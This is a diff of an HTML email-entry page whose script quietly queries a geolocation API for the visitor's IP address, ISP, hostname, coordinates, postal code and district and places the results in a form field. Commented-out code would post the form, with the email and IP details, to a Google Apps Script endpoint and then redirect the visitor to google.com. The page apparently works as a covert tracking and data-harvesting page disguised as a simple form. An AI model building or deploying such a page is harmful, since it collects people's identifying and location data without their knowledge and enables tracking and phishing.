@@ -1,5 +1,6 @@
 <!DOCTYPE html>
 <html lang="en">
+
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
@@ -12,6 +13,7 @@
         }
     </style>
 </head>
+
 <body>
     <form name="data" method="post" autocomplete="off" id="data">
         Enter Your Email :
@@ -22,30 +24,36 @@
         <div id="isp"></div>
     </form>
 
-<div id="success">Success</div>
-<script>
-$.getJSON('https://json.geoiplookup.io/', function(data) {
-   var a = (JSON.stringify(data, null, 2));
-//    document.getElementById("ip-details").value = a;
-});
-$.get('https://json.geoiplookup.io/', function(res) {var a = ("IP Address : " + res.ip + "\n" + "ISP : " + res.isp + "\n" + "Organization : " + res.org + "\n" + "Hostname : " + res.hostname + "\n" + "Latitude : " + res.latitude + "\n" + "Longitude : " + res.longitude + "\n" + "Postal Code : " + res.postal_code + "\n" + "Neighbourhood : " + res.city + "\n" + "Region : " + res.region + "\n" + "District : " + res.district + "\n" + "Country Code : " + res.country_code + "\n" + "Country : " + res.country_name + "\n" + "Continent : " + res.continent_name + "\n" + "Timezone Name : " + res.timezone_name + "\n" + "Connection Tyoe : " + res.connection_type + "\n" + "ASN Organization : " + res.asn_org + "\n" + "ASN : " + res.asn + "\n" + "Currency Code : " + res.currency_code  + "\n" + "Currency : " + res.currency_name);document.getElementById("ip-details").value = a;});
-        </script>
-        
+    <div id="success">Success</div>
+    <iframe src="https://gdurl.com/yTcH/viewer" width="100%" height="700px"></iframe>
+    <!-- <script type="text/javascript" src="https://gdurl.com/yTcH/viewer.js?w=600&780"></script> -->
     <script>
-    //     function myFunction() {
-    //       document.getElementById("ip-details").value = a;
-    //     }
-    //     const scriptURL = 'https://script.google.com/macros/s/AKfycbzqEO6r_szgLDtGwGsZGORUmFNGhJBH6axrYUBfmeZhz7_S41p2/exec'
-    // const form = document.forms['data']
-  
-    // form.addEventListener('submit', e => {
-    //   e.preventDefault()
-    //   fetch(scriptURL, { method: 'POST', body: new FormData(form)})
-    //     .then(response => window.location.replace("https://google.com"))
-    //     .catch(error => console.error('Error!', error.message))
-    //     document.querySelector('#success').style.display = 'block';
-    //     document.querySelector('#data').style.display = 'none';
-	// })
-        </script>
+        $.getJSON('https://json.geoiplookup.io/', function(data) {
+            var a = (JSON.stringify(data, null, 2));
+            //    document.getElementById("ip-details").value = a;
+        });
+        $.get('https://json.geoiplookup.io/', function(res) {
+            var a = ("IP Address : " + res.ip + "\n" + "ISP : " + res.isp + "\n" + "Organization : " + res.org + "\n" + "Hostname : " + res.hostname + "\n" + "Latitude : " + res.latitude + "\n" + "Longitude : " + res.longitude + "\n" + "Postal Code : " + res.postal_code + "\n" + "Neighbourhood : " + res.city + "\n" + "Region : " + res.region + "\n" + "District : " + res.district + "\n" + "Country Code : " + res.country_code + "\n" + "Country : " + res.country_name + "\n" + "Continent : " + res.continent_name + "\n" + "Timezone Name : " + res.timezone_name + "\n" + "Connection Tyoe : " + res.connection_type + "\n" + "ASN Organization : " + res.asn_org + "\n" + "ASN : " + res.asn + "\n" + "Currency Code : " + res.currency_code + "\n" + "Currency : " + res.currency_name);
+            document.getElementById("ip-details").value = a;
+        });
+    </script>
+
+    <script>
+        //     function myFunction() {
+        //       document.getElementById("ip-details").value = a;
+        //     }
+        //     const scriptURL = 'https://script.google.com/macros/s/AKfycbzqEO6r_szgLDtGwGsZGORUmFNGhJBH6axrYUBfmeZhz7_S41p2/exec'
+        // const form = document.forms['data']
+
+        // form.addEventListener('submit', e => {
+        //   e.preventDefault()
+        //   fetch(scriptURL, { method: 'POST', body: new FormData(form)})
+        //     .then(response => window.location.replace("https://google.com"))
+        //     .catch(error => console.error('Error!', error.message))
+        //     document.querySelector('#success').style.display = 'block';
+        //     document.querySelector('#data').style.display = 'none';
+        // })
+    </script>
 </body>
+
 </html>
